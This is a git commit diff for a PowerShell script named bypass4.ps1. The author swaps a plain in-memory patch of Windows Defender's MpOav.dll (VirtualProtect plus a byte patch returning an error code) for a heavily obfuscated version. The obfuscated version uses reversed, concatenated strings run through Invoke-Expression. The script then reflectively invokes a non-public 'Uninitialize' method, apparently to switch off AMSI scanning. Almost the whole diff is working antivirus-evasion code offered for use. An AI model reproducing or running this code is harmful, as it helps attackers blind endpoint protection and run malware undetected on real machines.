089614e6592135c97687b3f3a530c3eac825c44b
Sudo_Zeus <SudoZeus@protonmail.ch>
2024-04-18 17:32:24 -0700

    Update bypass4.ps1

--- bypass4.ps1
+++ bypass4.ps1
@@ -1,4 +1,4 @@
-$Zeus = @"
+$top = @"
 using System;
 using System.Runtime.InteropServices;
 public class APIs {
@@ -10,25 +10,43 @@ public class APIs {
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-Add-Type $Zeus
-$z1 = "0"
-$z2 = "x"
-$z3 = "B"
-$z4 = "8"
-$zzz1 = $z1+$z1+$z3+$z4
-$zzz2 = "0x57"
-$zzz3 = "0x00"
-$zzz4 = "0x07"
-$zzz5 = "0x80"
-$zzz6 = "0xC3"
-$PiZaCh = [Byte[]] ($zzz1,$zzz2,$zzz3,$zzz4,+$zzz5,+$zzz6)
-$LLz7 = [Zeus]::LoadLibrary("MpOav.dll")
-$addy = [Zeus]::GetProcAddress($LLz7,"DllGetClassObject")
-$sz = 0
-[Zeus]::VirtualProtect($addy, [uint32]6, 0x40, [ref]$sz)
 
 
-[sysTEM.rUntiME.iNtErOPsERvIcEs.MaRSHal]::CoPy($PiZaCh, 0, $addy, 6)
+.( $PshOME[4]+$pshomE[34]+'x') (( [reGEX]::MaTCHeS( "NOisseRpXE-ekovNi |)63]RahC[]gNIrTs[,'pUM'(ECaLPer.)43]RahC[]gNIrTs[,'uTo'(ECaLPer.)'
+'+')'+'6 '+',yd'+'d'+'apUM ,0 ,h'+'CaZi'+'PpUM(yPoC:'+':]laHS'+'R'+'aM.'+'s'+'E'+'cIvREsPO'+'rEt'+'N'+'i.EMitnUr'+'.ME'+'Tsy'+'s[
+
+'+'
+'+')z'+'sp'+'UM'+']fe'+'r[ ,0'+'4x'+'0 ,'+'6]'+'23t'+'ni'+'u[ ,yd'+'da'+'pUM(tc'+'etorPl'+'autriV::]p'+'ot'+'[
+0 '+'= z'+'spU'+'M
+)'+'uTotc'+'ej'+'b'+'Os'+'sal'+'Cte'+'GllDuTo,7'+'zL'+'LpUM'+'(s'+'s'+'e'+'r'+'d'+'d'+'Acor'+'P'+'t'+'e'+'G::]pot[ = yd'+'dapU'+'M
+)u'+'Toll'+'d.vaOpM'+'uTo'+'('+'yrar'+'biLdaoL:'+':]po'+'t[ '+'= '+'7'+'z'+'LLpUM
+'+')6zzzpUM'+'+'+',5zzz'+'p'+'UM+'+','+'4zzzpU'+'M,3zzz'+'p'+'UM,2zzz'+'pUM,1z'+'zz'+'pUM'+'( '+']]'+'[ety'+'B[ ='+' hCaZiPpUM
+26'+'zzpU'+'M + 16'+'zz'+'pUM '+'= 6z'+'zzpUM
+uT'+'o3Cu'+'To = '+'26z'+'zpUM
+u'+'To'+'x0'+'uTo = 16zzpU'+'M
+
+2'+'5zzpU'+'M +'+' '+'1'+'5'+'zzpUM ='+' '+'5'+'zz'+'zpUM'+'
+uT'+'o0'+'8'+'u'+'To'+' = '+'2'+'5z'+'zpUM'+'
+uT'+'o'+'x0uTo = 15z'+'zpUM
+'+'
+24z'+'z'+'p'+'U'+'M +'+' 1'+'4z'+'zpU'+'M'+' ='+' 4zz'+'z'+'pUM
+uTo'+'70'+'u'+'T'+'o = 24'+'z'+'zpUM
+'+'u'+'To'+'x'+'0uT'+'o ='+' 14zz'+'pUM'+'
+'+'
+'+'2'+'3zzpUM +'+' 1'+'3'+'z'+'zpU'+'M '+'='+' 3zzz'+'pUM
+'+'u'+'To0'+'0uT'+'o = '+'23zz'+'pUM
+uTox0uTo = 13'+'zzpUM
+
+22'+'zzp'+'UM'+' '+'+ 12zzpUM = 2'+'zzzpUM
+uT'+'o'+'75uTo'+' '+'= '+'22zz'+'pUM
+'+'u'+'T'+'o'+'x0uT'+'o '+'='+' 12zz'+'pUM
+
+'+'4zpU'+'M+'+'3zp'+'UM+'+'1zp'+'U'+'M+'+'1zpUM ='+' 1zzzpUM
+'+'uTo'+'8u'+'To'+' '+'= '+'4'+'zp'+'UM
+uTo'+'Bu'+'To '+'= 3'+'z'+'pUM
+'+'uToxuTo'+' = 2'+'zpUM'+'
+uTo0u'+'T'+'o = '+'1zpUM
+p'+'otpU'+'M epy'+'T-d'+'dA'( " ,'.' ,'rigHttOLeft')-jOIn '') )
 
 $s1 = 'Sys'
 $s2 = 'tem.Ma'
@@ -52,4 +70,4 @@ $tec = [Ref].aSSembly.gettYPE($SSS9)
 
 $ezi = $tec.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
 
-$ezi.In
+$ezi.Invoke($tec,$null)
